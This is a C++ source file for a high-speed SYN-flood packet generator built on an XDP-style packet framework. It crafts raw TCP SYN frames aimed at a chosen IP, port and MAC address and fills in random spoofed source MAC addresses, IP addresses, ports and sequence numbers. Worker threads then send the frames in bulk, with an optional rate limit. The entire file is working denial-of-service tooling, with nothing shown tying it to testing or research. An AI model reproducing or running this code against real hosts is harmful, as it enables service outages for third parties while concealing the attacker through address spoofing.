#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <time.h>
#include <signal.h>

#include "xdp_runtime.h"
#include "xdp_dev.h"
#include "xdp_net.h"
#include "xdp_framepool.h"
#include "xdp_prefetch.h"

#include "synflood.h"
#include "tokenbucket.h"

volatile bool SynFlood::running = true;
struct Channel SynFlood::channelList[MAX_QUEUE];
__thread long SynFlood::sendCount = 0;
uint64_t SynFlood::packetCount = 0;
in_addr_t SynFlood::dstIp = 0;
uint16_t SynFlood::dstPort = 0;
in_addr_t SynFlood::srcIp = 0;
uint8_t SynFlood::dstMac[ETH_ALEN];
uint8_t SynFlood::srcMac[ETH_ALEN];
long SynFlood::rate = 0;

void SynFlood::signalHandler(int sig)
{
    running = false;
    printf("quit by signal %d.........\n", sig);
}

void SynFlood::setPacketCount(uint64_t c)
{
    packetCount = c;
}

void SynFlood::setSignal(void)
{
    signal(SIGINT, signalHandler);
}

void SynFlood::setDstAddr(const char *ip, uint16_t port)
{
    dstIp = inet_addr(ip);
    dstPort = htons(port);
}

void SynFlood::setSrcAddr(const char *ip)
{
    if (ip && ip[0]) {
        srcIp = inet_addr(ip);
    } else {
        srcIp = 0;
    }
}

int SynFlood::setDstMac(const char *mac)
{
    return setMac(mac, dstMac);
}
int SynFlood::setSrcMac(const char *mac)
{
    return setMac(mac, srcMac);
}
int SynFlood::setMac(const char *mac, uint8_t addr[ETH_ALEN])
{
    const char *pos = mac;
    int8_t      x;
    int         i;

    for (i = 0; i < ETH_ALEN; i++) {
        x = digtal(*pos++);
        if (x < 0) {
            return -1;
        }
        addr[i] = x << 4;
        x = digtal(*pos++);
        if (x < 0) {
            return -1;
        }
        addr[i] |= x;
        if (i < ETH_ALEN - 1 && *pos++ != ':') {
            return -1;
        }
    }

    return *pos == '\0' ? 0 : -1;
}

void SynFlood::initPacket(struct xdp_frame *frame, struct Channel *ch)
{
    struct iphdr    *iphdr;
    struct ethhdr   *ethhdr;
    struct tcphdr   *tcphdr;

    int i; 
    int len;
    ethhdr = xdp_frame_get_addr(frame, struct ethhdr *);
    ethhdr->h_proto = xdp_htons(ETH_P_IP);
    for (i = 0; i < ETH_ALEN; i++) {
        ethhdr->h_dest[i] = dstMac[i];
        //ethhdr->h_source[i] = srcMac[i];
    }
    iphdr = (struct iphdr *) (ethhdr + 1);
    tcphdr = (struct tcphdr *) (iphdr + 1);
    len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iphdr->ihl = sizeof(struct iphdr) >> 2;
    iphdr->version = 4;
    iphdr->tos = 0;
    iphdr->tot_len = xdp_htons(len);
    iphdr->id = 1;
    iphdr->frag_off = 0x40;
    iphdr->ttl = 255;
    iphdr->protocol = IPPROTO_TCP;
    iphdr->daddr = dstIp;
    iphdr->check = 0;

    tcphdr->dest = dstPort; 
    tcphdr->ack = 0;
    tcphdr->doff = sizeof(struct tcphdr) >> 2;
    tcphdr->syn = 1;
    tcphdr->window = xdp_htons(2048);
    tcphdr->check = 0;
    tcphdr->urg_ptr = 0;
    tcphdr->check = 0;
    ch->send_bufs[ch->sendCount++] = frame;
    frame->data_len = sizeof(struct ethhdr) + len;
}
void SynFlood::updatePacket(struct xdp_frame *frame)
{
    struct iphdr    *iphdr;
    struct ethhdr   *ethhdr;
    struct tcphdr   *tcphdr;

    ethhdr = xdp_frame_get_addr(frame, struct ethhdr *);
    iphdr = (struct iphdr *) (ethhdr + 1);
    tcphdr = (struct tcphdr *) (iphdr + 1);

    *(uint32_t *)ethhdr->h_source = rand();
    *(uint16_t *)(ethhdr->h_source + 4) = rand() & 0xFFFF;

    iphdr->saddr = srcIp ? srcIp : rand(); 
    iphdr->check = xdp_ipv4_checksum(iphdr);

    tcphdr->source = xdp_htons(rand() & 0xFFFF);
    tcphdr->seq = xdp_htonl(rand() & 0xFFFFFFFF);
    tcphdr->check = xdp_ipv4_udptcp_checksum(iphdr, tcphdr);
}

int SynFlood::sender(volatile void *args)
{
    int          frame_count;
    uint64_t     total = 0;
    uint16_t     sent = 0;
    uint16_t     qIdx = 0;

    struct xdp_frame *frame[BUF_NUM]; 
    struct Channel   *chn;

    qIdx = *(uint16_t *)args;
    chn = &channelList[qIdx];
    if (rate) {
        printf("worker[%u]: rate-limiting %ld packet/s\n",
            XDP_RUNTIME_WORKER_ID, rate);
    }
    TokenBucket tokenBucket(rate, rate << 4, 0);
    
    srand(time(NULL));
    while (running) {
        int i;
        frame_count = xdp_dev_get_empty_frame(qIdx, frame, BUF_NUM);
        if (!frame_count) {
            break;
        }
        
        for (i = 0; i < 3 && i < frame_count; i++) {
            xdp_prefetch0(xdp_frame_get_addr(frame[i], void *));
        }
        for (i = 0; i < frame_count - 3; i++) {
            xdp_prefetch0(xdp_frame_get_addr(frame[i + 3], void *));
            initPacket(frame[i], chn);
            updatePacket(frame[i]);
        }
        for (; i < frame_count; i++) {
            initPacket(frame[i], chn);
            updatePacket(frame[i]);
        }

        sendCount = tokenBucket.fetchToken(chn->sendCount);
        if (xdp_runtime_likely(sendCount)) {
            sent = xdp_dev_write(qIdx, chn->send_bufs, sendCount);
            if (xdp_runtime_unlikely(sent != chn->sendCount)) {
                for (i = sent; i < chn->sendCount; i++) {
                    xdp_framepool_free_frame(chn->send_bufs[i]);
                }
            }
            chn->sendCount = 0;
        }
        if (sendCount > (uint64_t)sent) {
            tokenBucket.returnToken(sendCount - (uint64_t)sent);
        }
    }
    return 0;
}

